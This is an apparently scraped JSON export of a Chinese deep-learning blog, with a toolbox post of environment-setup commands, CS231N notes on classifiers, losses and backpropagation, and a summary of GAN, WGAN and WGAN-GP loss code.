https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main# - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free# - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/r# - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/pro# - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/msys2custom_channels: conda-forge: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud msys2: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud bioconda: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud menpo: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud pytorch: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud simpleitk: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud 删除源 1conda config --remove-key channels ¶安装Detectron2 123456conda create -n &quot;corona2&quot; python=3.7conda install cudatoolkit=11.0pip3 install torch==1.7.0 torchvision==0.8.0 torchaudio==0.7.0python -m pip install detectron2 -f https://dl.fbaipublicfiles.com/detectron2/wheels/cu110/torch1.7/index.htmlpip3 install opencv-pythonpip install torch==1.7.0+cu110 torchvision==0.8.1+cu110 torchaudio===0.7.0 -f https://download.pytorch.org/whl/torch_stable.html ¶pip源 1234567891011121314mkdir ~/.pip sudo vim ~/.pip/pip.conf # 修改内容如下，二选一 # 豆瓣源 [global]index-url = https://pypi.douban.com/simple[install]trusted-host = https://pypi.douban.com# 阿里源[global]index-url = https://mirrors.aliyun.com/pypi/simple/[install]trusted-host = https://mirrors.aliyun.com/pypi/simple/ ¶保持ssh不断连 编辑/etc/ssh/sshd_config文件设置心跳，保持连接。 编辑/etc/ssh/sshd_config，添加配置项： 12ClientAliveInterval 600 ClientAliveCountMax 1000 1sudo systemctl restart ssh service ¶Jupyter Lab 如何配置远程连接： https://cloud.tencent.com/developer/article/1740337 配置环境名称显示： 1python -m ipykernel install --user --name mistvenv --display-name &quot;corona&quot; ¶tensorboard相关操作 指定端口打开：–port 指定ip打开：–host tensorboard --logdir=logs --host=0.0.0.0 --port=8888 ¶CUDA版本对应 https://pytorch.org/get-started/previous-versions/ ¶四六级成绩查询 http://cjcx.neea.edu.cn/html1/folder/21033/653-1.htm ¶Linux指令 ¶unzip 1unzip test.zip 它会默认将文件解压到当前目录，如果要解压到指定目录，可以加上 -d 选项 1unzip test.zip -d &#x2F;root&#x2F; ¶FFmpeg mp4 转 mp3 1ffmpeg -i video.mp4 -b:a 192K -vn music.mp3 ¶百度文库 在文档页面的网址baidu后面加上**“vvv”**三个字母，然后回车就可以跳转到这个VVV文档在线导出工具网站的下载页面。 ¶Bilibili downloader https://www.videotosave.com/bilibili-video-downloader/ ¶Git","categories":[],"tags":[{"name":"工具箱","slug":"工具箱","permalink":"http://blog.keter.top/tags/%E5%B7%A5%E5%85%B7%E7%AE%B1/"}]},{"title":"「CS231N」神经网络与反向传播","slug":"「CS231N」神经网络与反向传播","date":"2021-08-17T05:48:06.000Z","updated":"2021-08-27T11:53:23.000Z","comments":true,"path":"2021/08/17/「CS231N」神经网络与反向传播/","link":"","permalink":"http://blog.keter.top/2021/08/17/%E3%80%8CCS231N%E3%80%8D%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%B8%8E%E5%8F%8D%E5%90%91%E4%BC%A0%E6%92%AD/","excerpt":"","text":"上一节课中已经学习了如何定义损失函数以及根据这个损失函数去分类器。在这节课中将会学习神经网络与反向传播。 ¶神经网络 ¶神经网络 在上节课的内容中介绍了线性分类器，最简单的神经网络结构其实就是在线性分类器之后添加了激活函数。然后通过堆叠的方式形成了多层的结构。 其中的 max(0,W1x)max(0,W_1x)max(0,W1​x) 就是一种激活函数，也是一种非常经典的激活函数叫做 RELURELURELU 激活函数。 一个最简单的二层神经网络模型如下： “神经网络”是一个非常广泛的术语。对于上述的模型我们可以用全连接网络或者多层感知器(MLP)来描述他。 如果我们不用激活函数，得到的结果会更好吗？ 如果我们不用激活函数，以两层的网络结构举例。 f=W2W1xW3=W2W1∈RC×H,f=W3xf=W_{2} W_{1} x \\quad W_{3}=W_{2} W_{1} \\in \\mathbb{R}^{C \\times H}, f=W_{3} x \\\\ f=W2​W1​xW3​=W2​W1​∈RC×H,f=W3​x 堆叠的结果可以写成f=W2W1xf=W_2W_1xf=W2​W1​x堆叠的结果又可以简写为 f=W3xf=W_3xf=W3​x ，这样的话其实就和单个的线性层没有任何的差别了。 **非线性激活函数为神经网络带来了非线性，否则堆多少层神经元都与单个线性层无异。**激活函数为神经网络提供的非线性让神经网络能够拟合非线性边界。 ¶常见的激活函数 下图展示了常见的一些激活函数，目前使用的最广泛的就是Sigmoid和ReLU激活函数。 ¶神经网络的结构 一个最基础的神经网络包含了输入层，隐藏层和输出层三个结构。 输出层的神经元个数可以有非常多的含义，比如对于一个分类网络来说，输出层的神经个数往往就代表了类别个数。上图中的神经网络都是一个一个连接的，这一类的神经网络叫做 “全连接神经网络” 全连接网络的numpy代码实现： 1234567891011121314151617181920212223import numpy as npfrom numpy.random import randnN,D-in,H,D_out = 64,1000,100,10x,y = randn(N, D_in), randn(N, D_out)w1, w2 = randn(D_in, H), randn(H, D_out)for t in range(2000): h = 1 / (1 + np.exp(-x.dot(w1))) y_pred = h.dot(w2) # 计算平方差loss loss = np.square(y_pred-y).sum() print(t, loss) # 返现传播计算 grad_y_pred = 2.0 * (y_pred - y) gred_w2 = h.T.dot(grad_y_pred) grad_h = grad_y_pred.dot(w2.T) grad_w1 = x.T.dot(grad_h * h * (1 - h)) # 更新权重参数 w1 -= 1e-4 * grad_w1 w2 -= 1e-4 * grad_w2 正是由于神经网络的非线性，他才可以捕捉到非常底层非常高级的一些特征。比如对于下面的分类问题，神经网络就可以完全拟合数据的分布： ¶反向传播 我们已经知道了，神经网络是通过求导数的方式来进行权重参数的更新。但是目前的神经网络的层数非常的大，我们没有办法很轻易地用一个数学公式来表示神经网络。层数非常多也表明了我们需要求导的 “公式” 非常的复杂。在数学上我们是采用链式求导的方式来进行神经网路的梯度更新。进行梯度更新的过程我们把它叫做神经网络的反向传播。 让我们对一个复杂的神经网络手动计算反向传播的过程基本上是不可能的。但是当今在各大深度学习框架的加持下求神经网络的偏导数其实是一件非常简单的事情。本节的视频课中其实对于反向传播的运算过程进行了非常详细的讲解，但是计算的过程并不容易用文字的形式记录下来，这里我就没有写了。 在本节课中我们学习了神经网络的基础知识，了解了神经网络参数的更新过程。本节课的内容为下一节课中的卷积神经网络提供了一个基础。","categories":[{"name":"深度学习基础知识","slug":"深度学习基础知识","permalink":"http://blog.keter.top/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"name":"CS231N","slug":"深度学习基础知识/CS231N","permalink":"http://blog.keter.top/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/CS231N/"}],"tags":[{"name":"C3231N","slug":"C3231N","permalink":"http://blog.keter.top/tags/C3231N/"},{"name":"深度学习基础知识","slug":"深度学习基础知识","permalink":"http://blog.keter.top/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"}]},{"title":"「CS231N」损失函数与梯度下降","slug":"「CS231N」损失函数与梯度下降","date":"2021-08-13T06:01:02.000Z","updated":"2021-08-17T05:55:12.000Z","comments":true,"path":"2021/08/13/「CS231N」损失函数与梯度下降/","link":"","permalink":"http://blog.keter.top/2021/08/13/%E3%80%8CCS231N%E3%80%8D%E6%8D%9F%E5%A4%B1%E5%87%BD%E6%95%B0%E4%B8%8E%E6%A2%AF%E5%BA%A6%E4%B8%8B%E9%99%8D/","excerpt":"","text":"上一节的CS231N的课程中介绍了KNN算法与线性分类器算法。其中线性分类算法还没有介绍如何去实现，本节课中我们将会定义损失函数以及根据这个损失函数去优化线性分类器。引用PPT中的一段话： TODO Define a loss function that quantifies with the unhappiness with the scores across the training data Come up with a way of efficiently finding the parameters that minimize the loss function. (optimization) ¶损失函数 ¶Multiclass SVM loss ¶损失函数公式 这个损失函数是SVM中使用的loss。 假设输入为(xi,yi)(x_i,y_i)(xi​,yi​) 损失函数的定义如下： Li=∑j≠yi{0 if syi≥sj+1sj−syi+1 otherwise =∑j≠yimax⁡(0,sj−syi+1)\\begin{aligned} L_{i} &amp;=\\sum_{j \\neq y_{i}} \\begin{cases}0 &amp; \\text { if } s_{y_{i}} \\geq s_{j}+1 \\\\ s_{j}-s_{y_{i}}+1 &amp; \\text { otherwise }\\end{cases} \\\\ &amp;=\\sum_{j \\neq y_{i}} \\max \\left(0, s_{j}-s_{y_{i}}+1\\right) \\end{aligned} Li​​=j​=yi​∑​{0sj​−syi​​+1​ if syi​​≥sj​+1 otherwise ​=j​=yi​∑​max(0,sj​−syi​​+1)​ 其中sjs_jsj​ 是预测正确类别的分数。举一个例子，比如我们现在算一个三分类的损失函数，有猫、汽车和青蛙三种类别。现在我们输入一张猫的图像，输出的结果是[cat:3.2, car:5.1, frog:-1.7]，那么loss的计算过程就是： 1234L &#x3D; max(0,5.1-3.2+1) + max(0,-1.7 - 3.2 + 1) &#x3D; max(0,2.9) + max(0,-3.9) &#x3D; 2.9 + 0 &#x3D; 2.9 接下来有几个思考题： 当汽车的分数增加或减少1的时候，loss会有什么变化？ 答：loss不会发生变化，因为即使汽车的预测分数变化了1计算的结果也还是0. 公式中的1其实一个安全冗余度，也就是说loss只会惩罚和类别分数相近的预测。 loss的最小值和最大值是多少？ 答：最小值就是0，比如像汽车那一项。最大值理论上是正无穷。 刚刚开始训练的时候权重WWW, 这时loss是多少呢？ 答：约等于分类错误的类别 现在的损失函数是把错误的类比进行计算，如果把正确的类别也考虑进来呢？ 答：对于正确的预测s=0s=0s=0​那么损失会多加一个1。所有图片的预测loss都加了一个1，所以对于loss不会产生什么影响。 如果用求平均去代替求和会怎么样？ 答：使用平均代替求和其实并不会发生太大的变化，因为我们无非就是在损失函数那里去除了一个固定的常数。 代码实现 1234567# numpy代码实现multiclass SVM lossdef L_i_vectorized(x,y,W): scores = W.dot(x) margins = np.maximum(0,scores-scores[y]+1) margins[y] = 0 loss_i = np.sum(margins) return loss_i ¶正则化 “如无必要，勿增实体”，这是著名的奥卡姆剃刀原则。他的意思就是切勿浪费较多东西去做，用较少的东西，同样可以做好的事情。 添加正则项可以防止模型在训练集上表现的太好而导致其的模型泛化能力不强。 L(W)=1N∑NLi(f(xi,W),yi)+λR(W)L(W)=\\frac{1}{N} \\sum^{N} L_{i}\\left(f\\left(x_{i}, W\\right), y_{i}\\right)+\\lambda R(W)L(W)=N1​∑NLi​(f(xi​,W),yi​)+λR(W) 上面公式中的λR(W)\\lambda R(W)λR(W) 是一个权重系数。 几个简单正则化 L2正则化：R(W)=∑k∑lWk,l2R(W)=\\sum_{k} \\sum_{l} W_{k, l}^{2}R(W)=∑k​∑l​Wk,l2​ L1正则化：R(W)=∑k∑l∣Wk,l∣R(W)=\\sum_{k} \\sum_{l}\\left|W_{k, l}\\right|R(W)=∑k​∑l​∣Wk,l​∣ 弹性网络(L1 + L2)：R(W)=∑k∑lβWk,l2+∣Wk,l∣R(W)=\\sum_{k} \\sum_{l} \\beta W_{k, l}^{2}+\\left|W_{k, l}\\right|R(W)=∑k​∑l​βWk,l2​+∣Wk,l​∣ 除了这些比较简单的正则化外，我们还有：Dropout、Batch normalization、Stochastic depth等等较为复杂的正则化方法。 正则化可以帮助类似于f2f_2f2​ 这样的过拟合的模型。 ¶Softmax交叉熵损失 ¶Softmax分类器 在前面提到的模型当中，我们每个类别的score都是一个数，而且这些数没有一个具体的范围。**人们就希望可以将原始分类器分数解释为概率。**这样就可以用信息论中的一些公式去优化算法。交叉熵也是信息论中的概念。 为了将score转化为概率，人们引入了Softmax。他的公式如下： P(Y=k∣X=xi)=esk∑jesjP\\left(Y=k \\mid X=x_{i}\\right)=\\frac{e^{s_{k}}}{\\sum_{j} e^{s_{j}}}P(Y=k∣X=xi​)=∑j​esj​esk​​ Softmax的计算步骤主要分为两步： 将所有的score去指数 除以指数和 ¶损失函数 Softmax交叉熵损失函数的公式如下： Li=−log⁡(esyi∑jesj)L_{i}=-\\log \\left(\\frac{e^{s y_{i}}}{\\sum_{j} e^{s_{j}}}\\right)Li​=−log(∑j​esj​esyi​​) 这个公式和信息论中的自信息公式完全一样，但是他确实是根据公式一步一步去推导出来的。你也可以把Softmax损失函数理解为这个概率说包含的信息。 下面又有几个问题： LiL_iLi​的最大值和最小值是什么？ 答：参照一下log函数的图像就知道了，最大值就是正无穷，最小值就是0 一开始的时候每个类别的概率都是差不多的，Softmax交叉熵损失是多少呢？ 答：−log(C)-log(C)−log(C) ¶优化算法 优化算法的核心目的就是让loss最小化，你可以吧loss比较一个崎岖不平的山坡，我们的最终目的就是到达山底（loss最小的位置）。为了实现这个目标所采用的理论基础就是求导。 一维函数的求导公式如下： df(x)dx=lim⁡h→0f(x+h)−f(x)h\\frac{d f(x)}{d x}=\\lim _{h \\rightarrow 0} \\frac{f(x+h)-f(x)}{h}dxdf(x)​=limh→0​hf(x+h)−f(x)​ 在多维空间中，梯度是每个维上的(偏导数)向量，任何方向的斜率都是方向与梯度的点积。同时梯度下降法的方向是负梯度因为正的梯度是向上的，我们需要求loss的最小值所以是用的负梯度。 梯度下降的过程可以用如下代码表示： 123while True: weights_grad evaluate_gradient(loss_fun,data,weights) weights += - step_size * weights_grad ¶SGD（Stochastic Gradient Descent） 如果我们每次去更新权重的时候都计算一遍所有的图片，有些时候N会非常大，计算时间也就会很长 L(W)=1N∑i=1NLi(xi,yi,W)+λR(W)∇WL(W)=1N∑i=1N∇WLi(xi,yi,W)+λ∇WR(W)\\begin{aligned} L(W) &amp;=\\frac{1}{N} \\sum_{i=1}^{N} L_{i}\\left(x_{i}, y_{i}, W\\right)+\\lambda R(W) \\\\ \\nabla_{W} L(W) &amp;=\\frac{1}{N} \\sum_{i=1}^{N} \\nabla_{W} L_{i}\\left(x_{i}, y_{i}, W\\right)+\\lambda \\nabla_{W} R(W) \\end{aligned} L(W)∇W​L(W)​=N1​i=1∑N​Li​(xi​,yi​,W)+λR(W)=N1​i=1∑N​∇W​Li​(xi​,yi​,W)+λ∇W​R(W)​ SGD算法就是一次喂一小批的数据，一小批的数据肯定是没有总体数据具有代表性的。所以在训练的过程中loss可能会出现震荡的情况。但是毛主席说过：“道路是曲折的，前途是光明的”，SGD算法一般还是可以在最后达到一个比较好的收敛效果。 SGD的代码就可以表示为： 1234while True: # 一次喂入256个数据 weights_grad evaluate_gradient(loss_fun,data,weights,256) weights += - step_size * weights_grad ¶图像特征 在上一节的笔记中我有写到，使用线性分类器得到的权重提取到的都是比较浅层的特征。特征的选取在机器学习中是非常重要的一环，也有非常非常多相关的研究。 比如说对于下面这个数据，左边的数据如果选取x和y的坐标作为特征是很难将其区分的。但是如果把它转化为极坐标系的话就会很好进行区分。 又比如HoG(Histogram of Oriented Gradients 方向梯度直方图)，这也是一种提取图像特征的方法： 但是像HOG这样的特征其实属于人为设计的特征，在当代的卷积神经网络中。提取特征都是卷积神经网络替我们完成的。对于图像这样的数据我们不需要自己去构建特征，只需要用大量的数据来进行喂进去卷积神经网络就会进行帮我们提取特征了。 本次节课中我们学习了两种基础的损失函数，还学习了SGD优化器。最后课程介绍了图像特征相关的内容。这些都是深度学习中非常基础且重要的内容。","categories":[{"name":"深度学习基础知识","slug":"深度学习基础知识","permalink":"http://blog.keter.top/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"name":"CS231N","slug":"深度学习基础知识/CS231N","permalink":"http://blog.keter.top/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/CS231N/"}],"tags":[{"name":"深度学习基础知识","slug":"深度学习基础知识","permalink":"http://blog.keter.top/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"name":"花书","slug":"花书","permalink":"http://blog.keter.top/tags/%E8%8A%B1%E4%B9%A6/"}]},{"title":"「CS231N」图像分类-KNN与线性分类器","slug":"「CS231N」图像分类-KNN与线性分类器","date":"2021-08-12T06:01:02.000Z","updated":"2021-08-13T14:19:17.000Z","comments":true,"path":"2021/08/12/「CS231N」图像分类-KNN与线性分类器/","link":"","permalink":"http://blog.keter.top/2021/08/12/%E3%80%8CCS231N%E3%80%8D%E5%9B%BE%E5%83%8F%E5%88%86%E7%B1%BB-KNN%E4%B8%8E%E7%BA%BF%E6%80%A7%E5%88%86%E7%B1%BB%E5%99%A8/","excerpt":"","text":"本节课主要简介K最近岭(KNN)算法和线性分类器两种算法。 ¶什么是图像分类？ 图像分类问题就如它的名字一样，它解决的问题是输入一张图像如何计算出该章图像的类别。图像分类是计算机视觉领域的核心问题，后期的目标检测，语义分割，实例分割等任务都是基于图像分类问题去解决的。 ¶图像分类遇到的挑战 图像在计算机中是以数字矩阵的形式进行存储的，比如一只猫的图片他在计算机看来就是一个数字矩阵： 但是如果摄像机从不同的角度拍摄猫，或者不同背景的猫又或是不同品种的猫。这些图片的像素矩阵已经是完全不一样的了。那么我们要如何通过计算机去学习到“猫”这种特征呢？ 如果你想用硬编码的方式去实现一个图像分类，可能你写的就是这样的代码了。 123def classify_image(image): # Some magic here? return class_label 我们可以很清晰的认识到，图像分类并不像数组排序这样有一个“显式”的特征可以进行提取。no obvious way to hard-code the algorithm for recognizing a cat, or other classes 正是因为人们不能提取出一个硬编码来描述什么是一只猫，所以我们就采用数据驱动的方法去解决这个问题。 ¶机器学习：数据启动的方法 在上面已经说到了我们不能够使用硬编码的方式去写出来一个分类器。所以人们就选择用大数据的方式去让代码“学习”图像的特征。使用大数据去训练分类器的一般步骤如下： 制作数据集：图片和标签 使用机器学习算法去训练分类器 在新的图片上评估分类器 在CS231N的本节课程中介绍了两种算法，第一种算法是最近岭算法，第二种算法是线性分类算法。 ¶最近岭算法 最近岭算法非常的简单，举一个很形象的例子就是我要判断你是不是一个好人我就判断离你最近的那个人是不是好人。在训练过程也非常的简单，其实最近岭算法都不能算是有训练过程。它的训练过程可以说是记忆所有的数据和标签。在进行预测时去在它“记忆”的数据中找“最近”的图片，把“最近”的这个图片的标签当做预测的结果。 那么如何衡量两个图片之间的距离呢？ 我们可以使用L1距离来衡量图片之间的距离，L1距离的公式如下： d1(I1,I2)=∑p∣I1p−I2p∣d_{1}\\left(I_{1}, I_{2}\\right)=\\sum_{p}\\left|I_{1}^{p}-I_{2}^{p}\\right|d1​(I1​,I2​)=∑p​∣I1p​−I2p​∣ 这个公式也是很好理解，他就是将两个图片的像素值进行相减然后将所有像素值相加作为两张图片之间的距离。 最近岭的代码如下： 123456789101112131415161718192021222324import numpy as npclass NearestNeighbor: def __init__(self): pass def train(self,X,y) &quot;&quot;&quot; X的维度是N x D维，每一行都是一个图片（打平后），y是一个1xN为的label矩阵 &quot;&quot;&quot; self.Xtr = X self.ytr = y def predict(self,X): num_test = X.shape[0] Ypred = np.zeros(num_test,dtype=self.ytr.dtype) # 循环每一个测试集 for i in xrange(num_test): # 计算L1距离 distances = np.sum(np.abs(self.Xtr-X[i,:]),axis=1) # 找到L1距离最小的样本的索引 min_index = np.argmin(distances) # 将其作为预测的类别 Ypred[i] = self.ytr[min_index] return Ypred K最近岭（KNN） 对最近岭进行了小小优化的一种算法叫做K最近岭，最近岭是选择最近的一个。K最近岭是选择最近的K个。K最近岭算法的优点就是可以让决策便捷更加的平滑，减小各种 “边界凸起”。下图是K=1，2，3时的类别决策边界： 可以看到K=1的时候，边界处有很多的蜜汁凸起。这对于一个分类器来说是非常不好的。我们应该希望每个类别的边界尽可能的平滑。这样就不会因为输入的细微改变而导致输出类别发生彻底的变化。当然了现在有很多的研究都证明了当代的神经网络非常容易收到恶意样本的干扰（跑题了，这不不在本节范围内）。 不同的距离衡量函数 L1距离前面已经介绍过了，L1的公式如下： d1(I1,I2)=∑p∣I1p−I2p∣d_{1}\\left(I_{1}, I_{2}\\right)=\\sum_{p}\\left|I_{1}^{p}-I_{2}^{p}\\right| d1​(I1​,I2​)=p∑​∣I1p​−I2p​∣ 除了L1距离还有L2距离，L2距离就是我们高中熟知的点与点距离的计算公式。 d2(I1,I2)=∑p(I1p−I2p)2d_{2}\\left(I_{1}, I_{2}\\right)=\\sqrt{\\sum_{p}\\left(I_{1}^{p}-I_{2}^{p}\\right)^{2}} d2​(I1​,I2​)=p∑​(I1p​−I2p​)2​ L1距离和L2距离也有各自的特点，L1距离比较适用于坐标轴是明确的。如果特征没有明确的语义含义比如计算两地之间的距离，使用L2距离更合适。 K最近岭算法的缺点 非常的慢 无论是L1距离还是L2距离都有没有办法准确的衡量图片之间的距离。 维度的诅咒（随着维度的增加计算量是爆炸性的增加） ¶线性分类算法 在一维空间中线性分类器就是用一个点进行分类，二维空间中就是用一个直线来进行分类，三维空间中就是用一个平面来进行线性分类。对于多类别分类问题就可以用多个线性分类器来实现。 一个线性分类器可以抽象为以下的一个函数： f=Wx+bf = Wx+b f=Wx+b 多个线性分类器就可以完成多分类的这样一个任务: 我们现在需要做一个三分类的分类器。那么我们就有三个WWW]。每个分类器都会输出一个置信度，置信度最高的类别就是分类的结果。 比较有趣的一点是：我们如果使用在cifar10或者其他数据集上训练出来的线性分类器的权重WiW_iWi​的可视化结果。 这样说明了一点：线性分类器学习到的是浅层的图像特征，这点可以与目前的卷积网络提取的特征形成比较鲜明的对比。 线性分类器最大的问题是：线性分类器无法对于非线性的数据进行分类 在下一节的课程中将会写到如何去写损失函数、如何进行优化以及如何过度到卷积神经网络。","categories":[{"name":"深度学习基础知识","slug":"深度学习基础知识","permalink":"http://blog.keter.top/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"name":"CS231N","slug":"深度学习基础知识/CS231N","permalink":"http://blog.keter.top/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/CS231N/"}],"tags":[{"name":"深度学习基础知识","slug":"深度学习基础知识","permalink":"http://blog.keter.top/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"name":"花书","slug":"花书","permalink":"http://blog.keter.top/tags/%E8%8A%B1%E4%B9%A6/"}]},{"title":"「GAN」GAN损失函数总结","slug":"【GAN】GAN损失函数总结","date":"2021-08-10T06:01:02.000Z","updated":"2021-08-17T08:59:11.000Z","comments":true,"path":"2021/08/10/【GAN】GAN损失函数总结/","link":"","permalink":"http://blog.keter.top/2021/08/10/%E3%80%90GAN%E3%80%91GAN%E6%8D%9F%E5%A4%B1%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/","excerpt":"","text":"¶朴素GAN 朴素GAN的思想比较单纯，生成器负责生成假的数据。然后判别器负责鉴别这些数据。在计算LOSS的时候就是计算BCE LOSS，看一看代码就非常的清楚了。朴素GAN在计算损失函数的时候的计算依据是真的数据label就是1，假的数据label就是0。 123456789101112131415161718192021222324252627282930313233# 首先训练鉴别器for d_index in range(d_steps): # 1A: Train D on real d_real_data = Variable(d_sampler(d_input_size)) # 让判别器判断真的数据 d_real_decision = D(preprocess(d_real_data)) # 告诉判别器这些数据是真的 d_real_error = criterion(d_real_decision, Variable(torch.ones([1]))) # ones = true d_real_error.backward() # compute/store gradients, but don&#x27;t change params # 1B: Train D on fake d_gen_input = Variable(gi_sampler(minibatch_size, g_input_size)) # 生成假的数据 d_fake_data = G(d_gen_input).detach() # detach to avoid training G on these labels # 让判别器判断这些假数据 d_fake_decision = D(preprocess(d_fake_data.t())) # 告诉判别器这些数据是假的 d_fake_error = criterion(d_fake_decision, Variable(torch.zeros([1]))) # zeros = fake d_fake_error.backward() d_optimizer.step() # 然后训练生成器for g_index in range(g_steps): # 基于D的结果训练G，但是要注意不要训练到D了 G.zero_grad() gen_input = Variable(gi_sampler(minibatch_size, g_input_size)) g_fake_data = G(gen_input) dg_fake_decision = D(preprocess(g_fake_data.t())) # 欺骗鉴别器这些数据都是真的 g_error = criterion(dg_fake_decision, Variable(torch.ones([1]))) g_error.backward() g_optimizer.step() # 只更新生成器的参数 ge = extract(g_error)[0] ¶WGAN WGAN有以下的优点，只能说太妙了！ 彻底解决GAN训练不稳定的问题，不再需要小心平衡生成器和判别器的训练程度 基本解决了collapse mode的问题，确保了生成样本的多样性 训练过程中终于有一个像交叉熵、准确率这样的数值来指示训练的进程，这个数值越小代表GAN训练得越好，代表生成器产生的图像质量越高（如题图所示） 以上一切好处不需要精心设计的网络架构，最简单的多层全连接网络就可以做到 WGAN的改进只有如下几点： 判别器最后一层去掉sigmoid 生成器和判别器的loss不取log 每次更新判别器的参数之后把它们的绝对值截断到不超过一个固定常数c 不要用基于动量的优化算法（包括momentum和Adam），推荐RMSProp，SGD也行 前两点的其实就是不再使用JS散度，而第三点用于工程实训上保证判别器的目标函数平滑。最后一点其实是在实验中发现的，当使用Adam之类涉及动量的梯度下降算法时，判别器的损失可能会出现大幅度抖动的现象，而使用RMSProb或SGD算法后，这个问题就不会出现。 · 更多的内容可以参考：令人拍案叫绝的Wasserstein GAN ¶WGAN损失函数部分代码 Code from: https://github.com/martinarjovsky/WassersteinGAN/blob/master/main.py 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960while i &lt; len(dataloader): ############################ # (1) 更新鉴别器 ########################### for p in netD.parameters(): # reset requires_grad # 此项在更新生成器网络的时候应该设置为Flase p.requires_grad = True # 训练鉴别器Diter次 if gen_iterations &lt; 25 or gen_iterations % 500 == 0: Diters = 100 else: Diters = opt.Diters j = 0 while j &lt; Diters and i &lt; len(dataloader): j += 1 data = data_iter.next() i += 1 # train with real real_cpu, _ = data netD.zero_grad() batch_size = real_cpu.size(0) if opt.cuda: real_cpu = real_cpu.cuda() input.resize_as_(real_cpu).copy_(real_cpu) inputv = Variable(input) errD_real = netD(inputv) errD_real.backward(one) # train with fake noise.resize_(opt.batchSize, nz, 1, 1).normal_(0, 1) noisev = Variable(noise, volatile = True) # totally freeze netG fake = Variable(netG(noisev).data) inputv = fake errD_fake = netD(inputv) errD_fake.backward(mone) # 计算EM距离 errD = errD_real - errD_fake optimizerD.step() # 将判别器的梯度限制在一个范围之内【WGAN核心之处】 for p in netD.parameters(): p.data.clamp_(opt.clamp_lower, opt.clamp_upper) ############################ # (2) 更新生成器 ########################### for p in netD.parameters(): p.requires_grad = False netG.zero_grad() # in case our last batch was the tail batch of the dataloader, # make sure we feed a full batch of noise noise.resize_(opt.batchSize, nz, 1, 1).normal_(0, 1) noisev = Variable(noise) fake = netG(noisev) errG = netD(fake) errG.backward(one) optimizerG.step() gen_iterations += 1 ¶WGAN-GP损失函数部分代码 Code from：https://github.com/caogang/wgan-gp/blob/master/gan_mnist.py 计算gradient_penalty部分的代码 123456789101112131415161718192021def calc_gradient_penalty(netD, real_data, fake_data): # 从生成数据和真实数据之间的空间分布中抽取样本用来计算 alpha = torch.rand(BATCH_SIZE, 1) alpha = alpha.expand(real_data.size()) alpha = alpha.cuda(gpu) if use_cuda else alpha interpolates = alpha * real_data + ((1 - alpha) * fake_data) if use_cuda: interpolates = interpolates.cuda(gpu) interpolates = autograd.Variable(interpolates, requires_grad=True) disc_interpolates = netD(interpolates) gradients = autograd.grad(outputs=disc_interpolates, inputs=interpolates, grad_outputs=torch.ones(disc_interpolates.size()).cuda(gpu) if use_cuda else torch.ones( disc_interpolates.size()), create_graph=True, retain_graph=True, only_inputs=True)[0] gradient_penalty = ((gradients.norm(2, dim=1) - 1) ** 2).mean() * LAMBDA return gradient_penalty 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657############################# (1) 更新鉴别器###########################for p in netD.parameters(): # 此项在更新生成器网络的时候应该设置为Flase p.requires_grad = True for iter_d in xrange(CRITIC_ITERS): _data = data.next() real_data = torch.Tensor(_data) if use_cuda: real_data = real_data.cuda(gpu) real_data_v = autograd.Variable(real_data) netD.zero_grad() # train with real D_real = netD(real_data_v) D_real = D_real.mean() # print D_real D_real.backward(mone) # train with fake noise = torch.randn(BATCH_SIZE, 128) if use_cuda: noise = noise.cuda(gpu) noisev = autograd.Variable(noise, volatile=True) # totally freeze netG fake = autograd.Variable(netG(noisev).data) inputv = fake D_fake = netD(inputv) D_fake = D_fake.mean() D_fake.backward(one) # 计算 gradient penalty gradient_penalty = calc_gradient_penalty(netD, real_data_v.data, fake.data) gradient_penalty.backward() D_cost = D_fake - D_real + gradient_penalty Wasserstein_D = D_real - D_fake optimizerD.step()############################# (2) Update G network###########################for p in netD.parameters(): # 避免计算鉴别器 p.requires_grad = FalsenetG.zero_grad()noise = torch.randn(BATCH_SIZE, 128)if use_cuda: noise = noise.cuda(gpu) noisev = autograd.Variable(noise) fake = netG(noisev) G = netD(fake) G = G.mean() G.backward(mone) G_cost = -G optimizerG.step() ¶SN-GAN WGAN-GP使用graident penalty的方法来限制判别器，但是这种方法只能对生成数据分布与真实数据分布之间的分布空间的数据做梯度惩罚，无法对整个空间的数据都做惩罚，这会导致随着训练的进行，生成数据分布与真实数据分布之间的空间会逐渐变化，从而导致graident 